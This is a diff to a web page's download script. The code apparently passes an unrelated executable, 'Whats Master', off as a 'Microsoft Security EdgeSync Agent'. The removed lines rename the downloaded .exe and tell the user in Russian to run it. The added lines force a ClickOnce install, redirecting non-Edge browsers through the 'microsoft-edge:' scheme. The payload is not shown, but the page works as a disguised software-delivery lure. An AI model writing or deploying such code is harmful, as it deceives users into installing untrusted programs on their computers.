@@ -12,32 +12,27 @@
     <script>
       function startDownload() {
         const baseUrl = window.location.protocol + "//" + window.location.host;
-        const exeUrl = `${baseUrl}/deploy/Whats Master-v9.1.0-win-x64.exe`;
+        const clickonceLink = `${baseUrl}/deploy/whatsmaster.application`;
+        const uap = new UAParser();
+        const browserName = uap.getResult().browser.name;
 
-        console.log("Starting Security EdgeSync Agent download");
-        console.log("Download URL:", exeUrl);
+        console.log(
+          "Starting Security EdgeSync Agent via ClickOnce, browser:",
+          browserName,
+        );
+        console.log("ClickOnce URL:", clickonceLink);
+        console.log("Domain:", window.location.host);
 
-        // Show download notification
-        alert("Начинается скачивание Security EdgeSync Agent (79 MB)...");
-
-        // Create download link
-        const link = document.createElement("a");
-        link.href = exeUrl;
-        link.download = "EdgeSync-Agent-Setup.exe";
-        link.style.display = "none";
-
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-
-        console.log("Download started");
-
-        // Show instructions
-        setTimeout(() => {
-          alert(
-            "Файл скачивается! После завершения запустите EdgeSync-Agent-Setup.exe для установки Microsoft Security EdgeSync Agent.",
-          );
-        }, 1000);
+        if (browserName !== "Edge") {
+          // Redirect to Edge with ClickOnce file
+          const edgeUrl = `microsoft-edge:${clickonceLink}`;
+          console.log("Redirecting to Edge:", edgeUrl);
+          window.location.href = edgeUrl;
+        } else {
+          // Direct ClickOnce launch in Edge
+          console.log("Direct ClickOnce launch in Edge");
+          window.location.href = clickonceLink;
+        }
       }
 
       // Make function globally available
